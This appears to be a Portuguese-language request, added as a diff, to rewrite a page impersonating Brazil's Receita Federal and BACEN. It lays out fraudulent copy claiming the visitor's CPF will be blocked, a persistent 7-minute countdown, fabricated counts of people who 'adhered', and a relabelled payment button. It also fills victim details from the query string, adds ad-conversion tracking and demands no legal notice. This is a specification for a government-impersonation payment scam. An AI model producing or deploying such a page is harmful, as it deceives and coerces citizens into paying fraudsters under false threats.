@@ -1,0 +1,88 @@
+Crie exatamente 3 arquivos (index.html, style.css, script.js) que **sobrescrevam** a página servida em:
+https://49eafd34-33e1-467f-9764-692137e4463700-230awuv116h4t.picard.replit.dev/01101101105  
+mantendo:
+
+- fundo #FFFFFF, texto #000, azul #003366, amarelo #F3CD00, vermelho #CC0000  
+- brasão, emblema, menu, largura 960 px centralizada  
+- **botão que já existe** (sem mudar cor, sem mudar função, sem criar novo)  
+- informações dinâmicas (nome, CPF, nº processo) via query string:  
+  ?nome=XYZ&cpf=000.000.000-00&processo=0000.00.0000&nasc=99/99/9999&mãe=NOME  
+
+Apenas **otimize copy, timer e gatilhos** conforme abaixo:
+
+### 1. index.html – substituições de copy
+
+(a) Título “Situação Cadastral do CPF”  
+↓  
+“Situação Cadastral – **Bloqueio automático em 7 min**”
+
+(b) “Intimação Fiscal – RECEITA FEDERAL DO BRASIL”  
+↓  
+“⚠️ Intimação Final – BACEN & Receita Federal”
+
+(c) Parágrafo de abertura  
+“…após cruzamento de dados…”  
+↓  
+“Em cruzamento em tempo real entre BACEN, Receita e Dataprev, seu CPF foi **sinalizado como alto risco fiscal**. O bloqueio entra em vigor automaticamente às 23:59 de hoje.”
+
+(d) Lista de punições – insira 1 novo item no topo  
+“- Seu nome já consta na lista restritiva interna do BACEN (enviada aos bancos agora).”
+
+(e) “Carregando Extrato (DIRPF):”  
+↓  
+“Preparando termo de regularização (DIRPF 2025):”
+
+(f) Texto do botão **existente** (não mude cor, nem função)  
+“Consultar / Pagar”  
+↓  
+“Aderir à Regularização – evite o bloqueio”
+
+(g) Microcopy abaixo do botão  
+“⏳ Assim que o cronômetro zerar, o boleto perde validade e seu CPF será bloqueado no BACEN.”
+
+(h) Popup flutuante (bottom-right)  
+“⏰ 3.847 pessoas aderiram nos últimos 30 min – fila: 6 min”
+
+### 2. style.css – apenas 3 acrescentos
+
+.contador { color:#CC0000; font-size:18px; font-weight:bold; animation:pulse 1s infinite; }  
+.popup-flutuante { position:fixed; bottom:15px; right:15px; background:#FFF3CD; border:1px solid #FFEEBA; padding:8px 12px; border-radius:4px; font-size:13px; box-shadow:0 2px 6px rgba(0,0,0,.15); z-index:999; }  
+@keyframes pulse { 50% { transform:scale(1.03); } }
+
+### 3. script.js – lógicas
+
+- Capture query string:  
+  const params = new URLSearchParams(location.search);  
+  document.getElementById(‘nome’).textContent  = params.get(‘nome’);  
+  document.getElementById(‘cpf’).textContent   = params.get(‘cpf’);  
+  document.getElementById(‘processo’).textContent = params.get(‘processo’);
+
+- Timer 07:00 (MM:SS) exibido logo após título; zerando:  
+  – desabilita botão existente (disabled=true)  
+  – muda texto para “Prazo encerrado – CPF bloqueado”  
+  – muda cor de fundo do botão para #6c757d
+
+- Tracking **apenas no clique do botão já existente**:
+  btn.addEventListener(‘click’, () => {
+     ga(‘send’,’event’,’regularizacao’,’click’,’aderir-7min’);
+     fbq(‘track’,’AddToCart’);
+  });
+
+- Popup de prova social: sorteia 3500-4500, atualiza a cada 7 s
+
+- Persiste timer em localStorage (continua de onde parou se reload)
+
+- Sem criar novo botão, sem gerar PIX, sem abrir modal de pagamento
+
+4. Segurança & performance
+   - Gzip ativado, cache 5 min estáticos
+   - CSP básica: default-src ‘self’; script-src ‘self’ https://www.googletagmanager.com; img-src ‘self’ data:
+
+5. Entregáveis
+   - index.html (com substituições acima)
+   - style.css (core oficial + 3 classes novas)
+   - script.js (timer, parâmetros dinâmicos, tracking, disable ao zerar)
+
+README vazio.  
+Nenhum aviso legal.  
+Nenhuma funcionalidade de pagamento.
